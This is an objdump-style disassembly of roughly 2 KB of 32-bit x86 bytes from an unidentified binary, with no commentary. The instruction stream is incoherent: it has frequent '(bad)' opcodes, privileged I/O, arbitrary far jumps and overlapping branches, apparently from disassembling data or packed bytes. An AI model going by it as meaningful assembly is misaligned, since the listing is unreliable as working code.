  4083d7:	bound  ebx,QWORD PTR [edx-0x245b617a]
  4083dd:	pop    eax
  4083de:	sub    BYTE PTR [ecx+ecx*4],ch
  4083e1:	add    BYTE PTR [eax+ecx*4],ch
  4083e4:	push   ss
  4083e5:	cld    
  4083e6:	and    eax,0x4da60fd4
  4083eb:	mov    eax,0x2069c3a6
  4083f0:	fdivr  QWORD PTR [ebp+0x1c]
  4083f3:	push   edx
  4083f4:	and    DWORD PTR [edi],esi
  4083f6:	test   BYTE PTR [ebp+0x2d9dbb3c],al
  4083fc:	mov    ecx,0xb44a86a1
  408401:	sbb    ch,BYTE PTR [edi+ebx*1-0x80]
  408405:	push   ecx
  408406:	std    
  408407:	aas    
  408408:	dec    edi
  408409:	jle    0x408483
  40840b:	xor    DWORD PTR [esi-0x7f],edx
  40840e:	dec    ebx
  40840f:	pop    ebx
  408410:	(bad)  
  408411:	dec    ebp
  408412:	sub    DWORD PTR [edx+edi*4],esi
  408415:	mov    ds:0x83de5663,eax
  40841a:	stos   BYTE PTR es:[edi],al
  40841b:	inc    esp
  40841c:	dec    edi
  40841d:	into   
  40841e:	and    eax,0x7bbc5be6
  408423:	adc    cl,dh
  408425:	fwait
  408426:	inc    esp
  408427:	xchg   edx,eax
  408428:	addr16 xchg ecx,ebp
  40842b:	outs   dx,BYTE PTR ds:[esi]
  40842c:	in     eax,dx
  40842d:	jge    0x408407
  40842f:	xor    bh,ah
  408431:	out    dx,eax
  408432:	bnd jle 0x4084b2
  408435:	sbb    al,0xc6
  408437:	cwde   
  408438:	je     0x40843a
  40843a:	loope  0x408498
  40843c:	cmp    eax,0x11cb25fd
  408441:	pop    ss
  408442:	add    DWORD PTR [eax+0x1a],0xffffffeb
  408446:	mov    ds:0xe9587b52,al
  40844b:	out    dx,al
  40844c:	in     eax,0xd6
  40844e:	call   0x85a18836
  408453:	inc    esi
  408454:	add    eax,0xda8c4a73
  408459:	add    al,0x7c
  40845b:	inc    eax
  40845c:	mov    al,ds:0x4a4039f6
  408461:	mov    edx,0x6a134f69
  408466:	jae    0x408465
  408468:	sub    ch,BYTE PTR ds:0xa78d765b
  40846e:	push   ss
  40846f:	(bad)  
  408470:	in     al,dx
  408471:	adc    esp,DWORD PTR [ebx+eiz*1-0x15]
  408475:	imul   edi,DWORD PTR [edx+0x18],0x95cbe8c3
  40847c:	repnz dec edi
  40847e:	inc    ebx
  40847f:	nop
  408480:	push   esi
  408481:	push   edx
  408482:	pop    edx
  408483:	nop
  408484:	lock add esp,DWORD PTR ss:[edx]
  408488:	into   
  408489:	fwait
  40848a:	push   ecx
  40848b:	push   esi
  40848c:	jl     0x40842a
  40848e:	fs jae 0x4084ce
  408491:	push   es
  408492:	mov    ecx,0x3df39a85
  408497:	sbb    bl,BYTE PTR [ebx]
  408499:	pop    ebx
  40849a:	mov    eax,0x8e7a81a
  40849f:	cmp    eax,0x6fcc90f9
  4084a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084a5:	stos   DWORD PTR es:[edi],eax
  4084a6:	jns    0x408457
  4084a8:	call   0x33ccbb2a
  4084ad:	mov    ah,0x32
  4084af:	add    eax,0x5e46f67d
  4084b4:	mov    ds:0x1d1c6afe,eax
  4084b9:	inc    eax
  4084ba:	sbb    ebp,eax
  4084bc:	xchg   ebx,eax
  4084bd:	(bad)  
  4084be:	cli    
  4084bf:	mov    eax,0x7a7aa82b
  4084c4:	cld    
  4084c5:	cmp    DWORD PTR [edi+0x187d1b5c],ecx
  4084cb:	xchg   esi,eax
  4084cc:	jmp    0x40852c
  4084ce:	xor    DWORD PTR [ecx],ecx
  4084d0:	test   al,0xf0
  4084d2:	daa    
  4084d3:	mov    ebx,0x89a8d149
  4084d8:	and    ebp,DWORD PTR [edx-0x54]
  4084db:	cwde   
  4084dc:	repz mov bh,0x26
  4084df:	dec    eax
  4084e0:	call   0x52586cb
  4084e5:	outs   dx,DWORD PTR ds:[esi]
  4084e6:	mov    edx,0xe91d620b
  4084eb:	shl    DWORD PTR [esi+ecx*8+0x5c],cl
  4084ef:	and    esi,esp
  4084f1:	lods   eax,DWORD PTR ds:[esi]
  4084f2:	popa   
  4084f3:	in     al,0xba
  4084f5:	retf   0x731b
  4084f8:	sub    BYTE PTR [eax+0x4ab019d3],dl
  4084fe:	fisubr DWORD PTR [ebp+0x1c83c067]
  408504:	adc    dl,dl
  408506:	xor    BYTE PTR [edx],ch
  408508:	iret   
  408509:	dec    ebx
  40850a:	enter  0x3912,0xac
  40850e:	int    0x38
  408510:	ss loopne 0x4084ad
  408513:	xor    BYTE PTR ds:0x13fba806,cl
  408519:	call   0x87ec:0x74c9a40a
  408520:	inc    esp
  408521:	aas    
  408522:	leave  
  408523:	sub    BYTE PTR [ecx*4+0x9cc0cea],ah
  40852a:	jmp    0xf46c:0x98b1bbee
  408531:	stos   DWORD PTR es:[edi],eax
  408532:	pushf  
  408533:	ja     0x40853f
  408535:	xchg   DWORD PTR ds:0x82d78eed,ebp
  40853b:	jbe    0x4084db
  40853d:	(bad)  
  40853e:	pop    ss
  40853f:	inc    DWORD PTR [ebp-0x467f6c1b]
  408545:	test   edx,ebx
  408547:	jae    0x4085c8
  408549:	sbb    DWORD PTR [edi],edx
  40854b:	jno    0x408588
  40854d:	call   0x45cb:0xbef22522
  408554:	fistp  WORD PTR [ebp+eax*8+0x39]
  408559:	push   edx
  40855a:	jge    0x40858d
  40855c:	test   eax,0x9fe029b4
  408561:	inc    ebp
  408562:	call   0x7b21a9f7
  408567:	mov    esi,0xba07c664
  40856c:	pusha  
  40856d:	jmp    0x6447:0x1e383e03
  408574:	xchg   edx,eax
  408575:	or     BYTE PTR [ebx],0xf
  408578:	jns    0x408595
  40857a:	and    ebp,DWORD PTR [edx+0x71f428ab]
  408580:	inc    eax
  408581:	push   cs
  408582:	test   ch,0x25
  408585:	jae    0x40854a
  408587:	dec    ebx
  408588:	cmp    esp,DWORD PTR [eax-0x716d5428]
  40858e:	lds    esp,FWORD PTR [edi]
  408590:	mov    edx,0x54dbc40d
  408595:	aas    
  408596:	sbb    edi,DWORD PTR [ecx+0x49c66946]
  40859c:	js     0x40860f
  40859e:	mov    edx,0x597c8dee
  4085a3:	xchg   edi,eax
  4085a4:	jns    0x40860d
  4085a6:	retf   
  4085a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a8:	leave  
  4085a9:	in     al,dx
  4085aa:	fsub   QWORD PTR [eax-0x7d228c71]
  4085b0:	and    al,0x38
  4085b2:	push   esi
  4085b3:	jmp    0xd199:0x99769ce1
  4085ba:	pushf  
  4085bb:	ja     0x40854c
  4085bd:	enter  0xfdf0,0x55
  4085c1:	mov    edi,0xa661f51c
  4085c6:	xchg   ebx,eax
  4085c7:	mov    edx,0x955a2f51
  4085cc:	icebp  
  4085cd:	jecxz  0x4085cc
  4085cf:	sti    
  4085d0:	pop    es
  4085d1:	aas    
  4085d2:	pop    ds
  4085d3:	mov    bl,BYTE PTR [ebp-0x5b]
  4085d6:	jmp    0xaaf86209
  4085db:	mov    DWORD PTR [esi+0x25],ebx
  4085de:	mov    eax,DWORD PTR [eax+0x1c]
  4085e1:	pop    ebp
  4085e2:	inc    esi
  4085e3:	jg     0x4085f1
  4085e5:	inc    ebx
  4085e6:	mov    cl,0x28
  4085e8:	daa    
  4085e9:	cwde   
  4085ea:	inc    ebp
  4085eb:	push   edi
  4085ec:	cmp    ecx,edx
  4085ee:	add    DWORD PTR [eax-0x3a],esp
  4085f1:	xchg   ebp,eax
  4085f2:	inc    esp
  4085f3:	adc    al,BYTE PTR ds:0x431465f5
  4085f9:	jl     0x40857b
  4085fb:	cwde   
  4085fc:	in     al,dx
  4085fd:	cmp    ebp,DWORD PTR [edx+esi*2]
  408600:	jo     0x4085fa
  408602:	cwde   
  408603:	inc    ecx
  408604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408605:	sbb    ch,BYTE PTR [ecx-0x7a62a9f1]
  40860b:	dec    edi
  40860c:	retf   
  40860d:	fwait
  40860e:	rcr    BYTE PTR ds:0x68b73a94,cl
  408614:	sub    edx,eax
  408616:	jno    0x408628
  408618:	retf   
  408619:	xor    DWORD PTR [ebx+0x239e4db],edi
  40861f:	mov    cl,BYTE PTR [ebx+0x40]
  408622:	and    al,ch
  408624:	(bad)  
  408626:	cmc    
  408627:	sbb    al,al
  408629:	mov    dh,0x67
  40862b:	ss dec eax
  40862d:	or     DWORD PTR [ebx],0xb0a3c214
  408633:	mov    esi,0xadb2309
  408638:	das    
  408639:	ss into 
  40863b:	mov    ebp,0xd84bc1a1
  408640:	mov    al,ds:0xcd05864f
  408645:	adc    BYTE PTR [ebx+0x18],al
  408648:	div    BYTE PTR [edx]
  40864a:	call   0xced2:0x89ecbef3
  408651:	pop    ecx
  408652:	inc    esi
  408653:	dec    DWORD PTR [esi+0x194d3d7e]
  408659:	lods   al,BYTE PTR ds:[esi]
  40865a:	or     DWORD PTR [eax],eax
  40865c:	ds mov dl,0xf
  40865f:	sub    DWORD PTR [ebx],esi
  408661:	and    al,0xbd
  408663:	jbe    0x4086e0
  408665:	lahf   
  408666:	mov    eax,DWORD PTR [esi-0x45]
  408669:	loope  0x4086a4
  40866b:	shl    DWORD PTR [ebx-0x29],cl
  40866e:	inc    esi
  40866f:	jl     0x4086cd
  408671:	(bad)  
  408672:	ror    BYTE PTR [ebp-0x319c9504],0xf7
  408679:	lock (bad) 
  40867b:	loop   0x4086f4
  40867d:	pop    eax
  40867e:	int3   
  40867f:	nop
  408680:	mov    WORD PTR [esi+0x31],?
  408683:	sub    eax,0x62d34622
  408688:	clc    
  408689:	inc    ecx
  40868a:	adc    DWORD PTR [eax+0x45e1944],esp
  408690:	dec    eax
  408691:	xchg   ecx,eax
  408692:	out    0xe5,al
  408694:	sub    ch,dl
  408696:	mov    bl,0xb
  408698:	aas    
  408699:	aad    0xaf
  40869b:	into   
  40869c:	xchg   DWORD PTR [ecx],ebp
  40869e:	inc    esp
  40869f:	mov    es,ecx
  4086a1:	mov    ds:0x604a45b9,eax
  4086a6:	and    BYTE PTR [eax-0x32],dh
  4086a9:	lds    edx,FWORD PTR [ecx-0x17]
  4086ac:	push   esi
  4086ad:	add    DWORD PTR [esi],ebx
  4086af:	and    dh,BYTE PTR [esi+edx*2-0x1e]
  4086b3:	icebp  
  4086b4:	or     DWORD PTR [eax+0x39],esp
  4086b7:	ja     0x4086b5
  4086b9:	hlt    
  4086ba:	(bad)
  4086be:	mov    ds:0xd4530e9b,al
  4086c3:	and    ch,BYTE PTR [eax+0x5e]
  4086c6:	repz and BYTE PTR [edi],0xa6
  4086ca:	push   cs
  4086cb:	mov    cl,0xac
  4086cd:	add    DWORD PTR [esi+0x6e],esi
  4086d0:	jne    0x4086f5
  4086d2:	mov    cl,0xdf
  4086d4:	ror    DWORD PTR [esi],1
  4086d6:	ror    BYTE PTR [edi+eiz*1+0x1d],1
  4086da:	ror    DWORD PTR [ebp+0x3e],0xd6
  4086de:	mov    WORD PTR [eax+0x70],ds
  4086e1:	dec    edi
  4086e2:	fs dec esi
  4086e4:	mov    edx,ebx
  4086e6:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086e8:	mov    esi,0x354ab2a8
  4086ed:	mov    eax,0xb27ccd96
  4086f2:	out    0xf,eax
  4086f4:	cmp    ch,dh
  4086f6:	jge    0x4086c0
  4086f8:	add    BYTE PTR [edx+0x67001355],ch
  4086fe:	test   eax,0xebbd32d
  408703:	inc    esp
  408704:	fs mov al,0xd2
  408707:	lods   al,BYTE PTR ds:[esi]
  408708:	inc    ecx
  408709:	mov    WORD PTR [ebx],ss
  40870b:	add    edx,edx
  40870d:	enter  0x4a19,0x11
  408711:	out    dx,al
  408712:	push   eax
  408713:	add    al,0x53
  408715:	adc    al,0xb0
  408717:	ins    BYTE PTR es:[edi],dx
  408718:	ret    0x809d
  40871b:	push   ecx
  40871c:	aas    
  40871d:	outs   dx,DWORD PTR ds:[esi]
  40871e:	pop    ebp
  40871f:	inc    ebp
  408721:	jno    0x4086ac
  408723:	aaa    
  408724:	out    0x36,al
  408726:	xchg   ecx,eax
  408727:	retf   
  408728:	jle    0x4086dd
  40872a:	and    DWORD PTR [ebp+edi*4-0x39],eax
  40872e:	pop    eax
  40872f:	test   BYTE PTR [ecx+edx*2],0x88
  408733:	rol    DWORD PTR [eax+0x68],cl
  408736:	mov    ds:0xb300898f,al
  40873b:	cmp    eax,0x22011593
  408740:	sbb    esp,edi
  408742:	(bad)  
  408744:	imul   edi,DWORD PTR [ecx-0x52],0xe4f22612
  40874b:	cmp    eax,0xc4a2e544
  408750:	xor    ah,0xcb
  408753:	jmp    0x1990:0xa4be71e9
  40875a:	jnp    0x408767
  40875c:	mov    BYTE PTR [esi],bh
  40875e:	xor    al,0x86
  408760:	lods   al,BYTE PTR ds:[esi]
  408761:	xchg   ecx,eax
  408762:	ret    
  408763:	add    BYTE PTR [ecx-0x415cd883],ah
  408769:	aaa    
  40876a:	aaa    
  40876b:	pusha  
  40876c:	das    
  40876d:	aam    0x75
  40876f:	fwait
  408770:	push   cs
  408771:	sbb    edx,esi
  408773:	cmp    eax,0x5fd5976d
  408778:	fstp   TBYTE PTR [ebp-0x42243c57]
  40877e:	loop   0x408774
  408780:	mov    ecx,DWORD PTR [edi+0x3]
  408783:	inc    esp
  408784:	stos   BYTE PTR es:[edi],al
  408785:	cdq    
  408786:	xchg   esp,eax
  408787:	lods   eax,DWORD PTR ds:[esi]
  408788:	jmp    0x4087cd
  40878a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878b:	mov    ebx,esp
  40878d:	hlt    
  40878e:	push   ds
  40878f:	test   edi,edx
  408791:	jne    0x40874d
  408793:	jmp    0x120d:0x1f102de
  40879a:	pop    ecx
  40879b:	jmp    0x408776
  40879d:	inc    edi
  40879e:	add    eax,DWORD PTR [eax+0x53491ba6]
  4087a4:	mov    ds,esp
  4087a6:	adc    al,0x7f
  4087a8:	arpl   sp,ax
  4087aa:	mov    esi,0x8f097a92
  4087af:	out    dx,al
  4087b0:	add    al,0x41
  4087b2:	in     al,dx
  4087b3:	pop    eax
  4087b4:	loope  0x4087d5
  4087b6:	in     al,dx
  4087b7:	data16 jo 0x40878f
  4087ba:	xlat   BYTE PTR ds:[ebx]
  4087bb:	inc    esp
  4087bc:	mov    WORD PTR [edi+0x5eb1302a],es
  4087c2:	pop    ds
  4087c3:	mov    ?,WORD PTR [edx]
  4087c5:	jne    0x408764
  4087c7:	or     DWORD PTR [ebp-0x6ab4e1ae],ebp
  4087cd:	adc    DWORD PTR [eax+ebx*4],0x10
  4087d1:	inc    eax
  4087d2:	fucom  st(4)
  4087d4:	mov    al,0x13
  4087d6:	pop    ebx
  4087d7:	xchg   edx,eax
  4087d8:	and    eax,0x3f9a28d5
  4087dd:	ret    0x6036
  4087e0:	pop    esp
  4087e1:	adc    eax,0xda753f3
  4087e6:	out    0x5,eax
  4087e8:	aam    0x50
  4087ea:	test   al,0x5c
  4087ec:	ins    BYTE PTR es:[edi],dx
  4087ed:	out    dx,eax
  4087ee:	or     dl,BYTE PTR [esi+0x46]
  4087f1:	pop    edx
  4087f2:	dec    ecx
  4087f3:	in     al,0x8b
  4087f5:	fcomp  QWORD PTR [eax-0x419d91db]
  4087fb:	xchg   DWORD PTR [edx-0x28],esi
  4087fe:	xcrypt-cfb (bad)
  4087ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408800:	and    BYTE PTR [esi-0x23f050b4],bl
  408806:	fidivr DWORD PTR [esi-0x1871f840]
  40880c:	data16 mov BYTE PTR [edx-0x3d],al
  408810:	rcl    DWORD PTR [eax+0x5b],1
  408813:	lds    edx,FWORD PTR [ebx+eax*8-0x28d5411e]
  40881a:	adc    dh,BYTE PTR [ebp+0x2c2e60ce]
  408820:	sbb    DWORD PTR [esi],0xfffffff9
  408823:	mov    BYTE PTR [ecx+0x13],dl
  408826:	in     eax,0xb8
  408828:	push   esi
  408829:	sbb    BYTE PTR [edx],0xbd
  40882c:	int3   
  40882d:	cmp    BYTE PTR [ebx+0x5f],bh
  408830:	mov    esp,0x9a0e501
  408835:	or     DWORD PTR [ecx+eiz*2+0x58],ecx
  408839:	or     esp,ebp
  40883b:	pushf  
  40883c:	repnz push 0x9a5d4de5
  408842:	cwde   
  408843:	test   DWORD PTR [ecx+0xd],0xff932a15
  40884a:	sub    al,0x29
  40884c:	dec    eax
  40884d:	lahf   
  40884e:	mov    eax,0x5a972cb5
  408853:	push   edi
  408854:	outs   dx,BYTE PTR cs:[esi]
  408856:	or     ch,bh
  408858:	jl     0x4088ab
  40885a:	stos   DWORD PTR es:[edi],eax
  40885b:	jne    0x4087e3
  40885d:	mov    ebp,0xb2a1e0ac
  408862:	cdq    
  408863:	fmul   st,st(1)
  408865:	ror    DWORD PTR [ebx-0x3b],1
  408868:	fisub  WORD PTR [edx+0x6f]
  40886b:	fsubr  st(2),st
  40886d:	cdq    
  40886e:	inc    ebp
  40886f:	jns    0x4088d1
  408871:	fild   DWORD PTR [esi-0x4052013c]
  408877:	mov    dl,0x5f
  408879:	(bad)  [ecx-0x44]
  40887c:	cmc    
  40887d:	and    cl,cl
  40887f:	(bad)  
  408880:	push   esp
  408881:	les    eax,FWORD PTR [edx-0x3a]
  408884:	ss (bad) 
  408887:	clc    
  408888:	out    0xc,al
  40888a:	mov    WORD PTR [eax-0x74c8ddf4],cs
  408890:	sub    BYTE PTR [edx+0x52ca71bc],ch
  408896:	sbb    ah,BYTE PTR ds:0xfdcc9605
  40889c:	dec    ecx
  40889d:	pop    edi
  40889e:	jbe    0x40884d
  4088a0:	jnp    0x4088e1
  4088a2:	jmp    0xc35e:0xe89e246a
  4088a9:	imul   ebx,DWORD PTR [edx-0x1e],0x11
  4088ad:	iret   
  4088ae:	jecxz  0x4088b8
  4088b0:	xor    ch,BYTE PTR [edx+0x36af8e62]
  4088b6:	xchg   esi,eax
  4088b7:	leave  
  4088b8:	lahf   
  4088b9:	pusha  
  4088ba:	inc    DWORD PTR [ebp-0x5]
  4088bd:	adc    al,0xf3
  4088bf:	push   ecx
  4088c0:	push   cs
  4088c1:	sub    esp,ecx
  4088c3:	inc    edx
  4088c4:	push   edi
  4088c5:	jmp    0xb22b:0x7ffa4136
  4088cc:	jmp    0x3350f13e
  4088d1:	enter  0x3555,0x87
  4088d5:	clc    
  4088d6:	in     al,0xd3
  4088d8:	sub    eax,0x88d13038
  4088dd:	pop    esp
  4088de:	pusha  
  4088df:	out    dx,eax
  4088e0:	sub    esp,DWORD PTR [esi+0x2a9a46b9]
  4088e6:	cli    
  4088e7:	or     dh,BYTE PTR [ebp+0x145b4707]
  4088ed:	mov    eax,ds:0xdf2d35c
  4088f2:	jnp    0x40891e
  4088f4:	add    eax,0x2c5995b1
  4088f9:	add    eax,0xde15f508
  4088fe:	jb     0x408950
  408900:	cld    
  408901:	and    dl,BYTE PTR [edi]
  408903:	pop    ss
  408904:	gs in  al,0x59
  408907:	neg    BYTE PTR [eax]
  408909:	pop    ebx
  40890a:	sbb    eax,DWORD PTR [ecx+0x6d]
  40890d:	jae    0x408975
  40890f:	push   0x5e
  408911:	sti    
  408912:	shr    BYTE PTR gs:[esi+0x10],0xd9
  408917:	(bad)  
  408918:	out    dx,al
  408919:	adc    BYTE PTR [edx-0x170fd675],0x92
  408920:	add    esp,DWORD PTR [edx+edi*1+0xc0751a2]
  408927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408928:	xor    al,0xf4
  40892a:	mov    al,0x19
  40892c:	inc    ebx
  40892d:	enter  0x90a,0x22
  408931:	xor    ebx,DWORD PTR [edx+0x7c]
  408934:	xor    al,0xe6
  408936:	fldenv [ebp+ecx*2+0x2f]
  40893a:	pop    ebx
  40893b:	jg     0x4088c0
  40893d:	lds    esp,FWORD PTR [eax+0x10d4fb22]
  408943:	aad    0xe4
  408945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408946:	popa   
  408947:	pop    edx
  408948:	fimul  DWORD PTR [ebx]
  40894a:	pop    ecx
  40894b:	add    cl,BYTE PTR [esi]
  40894d:	in     eax,0x1a
  40894f:	(bad)  
  408950:	sti    
  408951:	popf   
  408952:	test   DWORD PTR [eax+0x41042c3],ebx
  408958:	adc    al,BYTE PTR [edi+0x37]
  40895b:	or     ebp,DWORD PTR [edi+ebp*4]
  40895e:	cmp    eax,0x1fbe4f70
  408963:	neg    BYTE PTR [esi+ebx*4+0x50]
  408967:	adc    esi,eax
  408969:	inc    ecx
  40896a:	das    
  40896b:	or     eax,0x9d61ae57
  408970:	cs xchg esp,eax
  408972:	mov    edx,0x33e2c188
  408977:	mov    ebp,0xea451808
  40897c:	mov    DWORD PTR [esi+0x7eb9d5ba],ebx
  408982:	ret    0x883b
  408985:	cmp    ah,ah
  408987:	in     eax,dx
  408988:	fs (bad) 
  40898a:	mov    cl,0x1a
  40898c:	mov    eax,ds:0xb4d75aa5
  408991:	pop    ecx
  408992:	ja     0x40895a
  408994:	ins    DWORD PTR es:[edi],dx
  408995:	mov    ds:0x4a81b41c,eax
  40899a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40899b:	inc    ecx
  40899d:	(bad)  
  40899e:	call   FWORD PTR [ebp+0x63]
  4089a1:	jbe    0x4089e6
  4089a3:	cs push ds
  4089a5:	and    DWORD PTR [eax+0x4d87e991],ebp
  4089ab:	jmp    0x892e6772
  4089b0:	shl    DWORD PTR [edx],1
  4089b2:	das    
  4089b3:	aaa    
  4089b4:	daa    
  4089b5:	sahf   
  4089b6:	push   edx
  4089b7:	xor    al,0xdc
  4089b9:	mov    bh,0xdf
  4089bb:	dec    ecx
  4089bc:	sbb    al,bl
  4089be:	and    esi,eax
  4089c0:	and    ebp,DWORD PTR [ecx]
  4089c2:	push   es
  4089c3:	clc    
  4089c4:	jmp    edx
  4089c6:	out    0x90,eax
  4089c8:	add    DWORD PTR [edx-0x38],ebp
  4089cb:	add    ah,ch
  4089cd:	call   0x32c6:0x67e8e588
  4089d4:	fcomp  DWORD PTR [ebp-0x70bd2cf5]
  4089da:	clc    
  4089db:	icebp  
  4089dc:	loope  0x4089e4
  4089de:	dec    ecx
  4089df:	mov    al,0x88
  4089e1:	out    dx,al
  4089e2:	or     DWORD PTR [edx],0x42cc5510
  4089e8:	xchg   edx,eax
  4089e9:	cwde   
  4089ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089eb:	jmp    0x42b4:0x4e139f59
  4089f2:	mov    eax,ds:0xc20c7702
  4089f7:	xor    esp,DWORD PTR [esi+0x77]
  4089fa:	push   ss
  4089fb:	imul   ebx,ebx,0x624b3ae1
  408a01:	xchg   ecx,eax
  408a02:	fiadd  DWORD PTR [ebx+edx*4+0x54]
  408a06:	data16 aas 
  408a08:	and    bh,bl
  408a0a:	aam    0xa9
  408a0c:	ret    0x148f
  408a0f:	push   ds
  408a10:	out    0xf4,eax
  408a12:	in     eax,dx
  408a13:	dec    ebp
  408a14:	ret    0xe34e
  408a17:	adc    BYTE PTR [ecx-0x3b495677],0x66
  408a1e:	test   BYTE PTR [ebp+0x20c51ba4],bh
  408a24:	imul   edx,DWORD PTR [ecx+0x5c],0x3d
  408a28:	in     al,dx
  408a29:	mov    esp,DWORD PTR [edx+0x1e]
  408a2c:	pop    ds
  408a2d:	imul   eax,DWORD PTR [ecx+0x15],0x42
  408a31:	cmp    DWORD PTR [esp+0x4251bcb5],esp
  408a38:	adc    eax,0xd1eebca7
  408a3d:	sahf   
  408a3e:	adc    DWORD PTR [eax+0x1e7fbf26],0x39
  408a45:	(bad)  
  408a46:	cmp    ch,BYTE PTR [ebx]
  408a48:	sbb    ah,cl
  408a4a:	xor    eax,0x52a03273
  408a4f:	push   0x6f
  408a51:	rol    dh,0xb3
  408a54:	in     eax,0x5a
  408a56:	inc    edx
  408a57:	nop
  408a58:	xchg   esp,eax
  408a59:	call   0x15f87db6
  408a5e:	push   0xffffffc6
  408a60:	mov    WORD PTR [edx],es
  408a62:	fisttp QWORD PTR es:[ecx+eax*1]
  408a66:	or     BYTE PTR [esi+0x61],bl
  408a69:	je     0x408a58
  408a6b:	loope  0x408a4a
  408a6d:	hlt    
  408a6e:	mov    al,0xbc
  408a70:	ror    esi,0x68
  408a73:	imul   esp,DWORD PTR [eax-0x32ef9f3a],0x5402a0fb
  408a7d:	sub    al,0xec
  408a7f:	sub    BYTE PTR [ebx+0x34d5b9f3],cl
  408a85:	jmp    0x8a19:0x81af76f7
  408a8c:	mov    dh,0x4a
  408a8e:	fsubp  st(2),st
  408a90:	dec    DWORD PTR [ecx+0x4e0a00f1]
  408a96:	cld    
  408a97:	adc    eax,0x81fbc321
  408a9c:	xchg   ecx,eax
  408a9d:	daa    
  408a9e:	sti    
  408a9f:	xor    BYTE PTR [eax-0x12],ch
  408aa2:	aad    0x25
  408aa4:	int3   
  408aa5:	and    eax,0x76ce6069
  408aaa:	xchg   ecx,eax
  408aab:	pop    esi
  408aac:	xchg   ebx,eax
  408aad:	shl    DWORD PTR [edi],cl
  408aaf:	xlat   BYTE PTR ds:[ebx]
  408ab0:	loop   0x408b22
  408ab2:	mov    ecx,0x6eb06e4b
  408ab7:	mov    ebx,0xee25869a
  408abc:	pop    eax
  408abd:	leave  
  408abe:	jns    0x408ab4
  408ac0:	dec    eax
  408ac1:	adc    eax,0x61389fe8
  408ac6:	push   0x31796228
  408acb:	jmp    0x2258:0xfb5e29a3
  408ad2:	clc    
  408ad3:	or     ebp,esp
  408ad5:	cmp    al,0xa0
  408ad7:	inc    esp
  408ad8:	pop    edx
  408ad9:	jns    0x408ae4
  408adb:	mov    ds:0xe946003b,eax
  408ae0:	mov    bl,0x1d
  408ae2:	aaa    
  408ae3:	test   DWORD PTR [ecx-0x44],0x54817050
  408aea:	sti    
  408aeb:	or     al,dh
  408aed:	sub    ecx,DWORD PTR [ecx]
  408aef:	sub    DWORD PTR [edx],ecx
  408af1:	test   BYTE PTR [edx+0x43],bh
  408af4:	xchg   edx,eax
  408af5:	out    dx,eax
  408af6:	adc    BYTE PTR ds:0x9ad42cf3,dl
  408afc:	jne    0x408ab9
  408afe:	mov    bh,0x33
  408b00:	cmp    eax,0x864407d2
  408b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b06:	ret    
  408b07:	cmp    dl,al
  408b09:	sbb    DWORD PTR [ecx+0x2ccb519f],0x57282d58
  408b13:	sub    ecx,ecx
  408b15:	mov    ch,0x70
  408b17:	test   al,0xe2
  408b19:	pop    edi
  408b1a:	popa   
  408b1b:	mov    eax,ds:0xd4fbef47
  408b20:	cs jnp 0x408b9b
  408b23:	(bad)  [esi+0x14cba4f7]
  408b29:	cli    
  408b2a:	mov    ds:0x76d5f5e2,al
  408b2f:	sti    
  408b30:	xchg   edx,eax
  408b31:	pop    ds
  408b32:	out    dx,al
  408b33:	pop    esp
  408b34:	xchg   esp,eax
  408b35:	inc    edi
  408b36:	push   esp
  408b37:	or     eax,0xe401ba3e
  408b3c:	push   ecx
  408b3d:	xor    edi,DWORD PTR [ecx+0x6755567d]
  408b43:	lds    esi,FWORD PTR [esi]
  408b45:	outs   dx,BYTE PTR ds:[esi]
  408b46:	ret    
  408b47:	ss pusha 
  408b49:	push   ds
  408b4a:	scas   al,BYTE PTR es:[edi]
  408b4b:	loope  0x408bcc
  408b4d:	les    edx,FWORD PTR [eax+0x55]
  408b50:	and    DWORD PTR [edi],esp
  408b52:	and    ebp,esi
  408b54:	jae    0x408b69
  408b56:	sub    ch,BYTE PTR [edx-0x7b]
  408b59:	dec    ebx
  408b5a:	xor    dl,BYTE PTR [eax+eiz*1-0x54007537]
  408b61:	xchg   DWORD PTR [edi+0x5e98504d],ebp
  408b67:	inc    ecx
  408b68:	inc    ebx
  408b69:	sahf   
  408b6a:	lahf   
  408b6b:	pop    esi
  408b6c:	dec    eax
  408b6d:	jo     0x408b74
  408b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b70:	jns    0x408ba9
  408b72:	sbb    edx,DWORD PTR [ebx-0x2c5ca74f]
  408b78:	mov    cl,0xc6
  408b7a:	dec    ebx
  408b7b:	outs   dx,DWORD PTR ds:[esi]
  408b7c:	xchg   esi,eax
  408b7d:	xchg   ebp,eax
  408b7e:	or     BYTE PTR [ebx+edx*2],dh
  408b81:	(bad)  
  408b82:	out    dx,al
  408b83:	imul   ebp,DWORD PTR [edi+eiz*2],0xccc3b5d
  408b8a:	(bad)  
  408b8b:	sub    cl,BYTE PTR [eax+0x6133346f]
  408b91:	xlat   BYTE PTR ds:[ebx]
  408b92:	mov    ebx,0xa858d343
  408b97:	ins    BYTE PTR es:[edi],dx
  408b98:	retf   0x74c3
  408b9b:	jbe    0x408be8
  408b9d:	rcr    DWORD PTR [edi],1
  408b9f:	jle    0x408b6b
  408ba1:	jno    0x408b8f
  408ba3:	mov    gs,WORD PTR [edx+0x7b]
  408ba6:	idiv   DWORD PTR [ebx-0x3a]
  408ba9:	fldcw  WORD PTR [ecx]
  408bab:	push   edi
  408bac:	inc    esp
  408bad:	ins    BYTE PTR es:[edi],dx
  408bae:	pop    es
  408baf:	retf   
  408bb0:	push   edx
  408bb1:	mov    eax,ds:0x45210dbf
  408bb6:	mov    ecx,0x19207ec0
  408bbb:	sub    al,0x22
  408bbd:	es jle 0x408c25
  408bc0:	test   al,0xd8
  408bc2:	mul    DWORD PTR [esp+edx*2+0x6d991f15]
  408bc9:	jle    0x408c3b
  408bcb:	es das 
  408bcd:	inc    eax
  408bce:	call   0x81418da8
  408bd3:	push   ss
  408bd4:	xchg   edi,eax
  408bd5:	jecxz  0x408b6a
